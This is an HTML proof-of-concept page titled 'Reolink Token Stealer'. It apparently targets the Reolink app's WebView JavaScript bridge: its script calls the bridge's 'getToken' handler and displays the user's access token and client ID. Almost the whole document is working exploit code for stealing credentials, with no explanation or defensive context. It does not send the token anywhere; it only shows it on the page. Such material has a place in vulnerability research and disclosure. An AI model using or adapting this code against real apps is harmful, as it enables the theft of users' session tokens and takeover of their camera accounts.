<!DOCTYPE html>
<html>
<head>
  <title>Token Stealer</title>
  <style>
    body {
      background: #111;
      color: #0f0;
      font-family: monospace;
      padding: 20px;
    }
    h1 {
      color: #f00;
    }
    .section {
      margin-bottom: 20px;
    }
    .label {
      color: #0ff;
    }
    .value {
      background: #222;
      padding: 10px;
      border: 1px solid #0f0;
      border-radius: 4px;
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <h1>Reolink Token Stealer</h1>
  <div class="section">
    <div class="label">Client ID:</div>
    <div id="client" class="value">waiting...</div>
  </div>
  <div class="section">
    <div class="label">Access Token:</div>
    <div id="token" class="value">waiting...</div>
  </div>

  <script>
    function waitForBridge(callback) {
      if (window.WebViewJavascriptBridge) {
        callback(WebViewJavascriptBridge);
      } else {
        document.addEventListener(
          'WebViewJavascriptBridgeReady',
          function () {
            callback(WebViewJavascriptBridge);
          },
          false
        );
      }
    }

    waitForBridge(function (bridge) {
      console.log('[*] Bridge Detected!');
      bridge.init(function (msg, cb) {
        console.log('[*] Bridge initialized via init()');
        cb("ok");
      });

      // 토큰 요청
      bridge.callHandler("getToken", null, function (res) {
        try {
          const obj = JSON.parse(res);
          document.getElementById("token").textContent = obj.token || "(no token)";
          document.getElementById("client").textContent = obj.clientId || "(no clientId)";
        } catch (e) {
          document.getElementById("token").textContent = res;
        }
      });
    });
  </script>
</body>
</html>
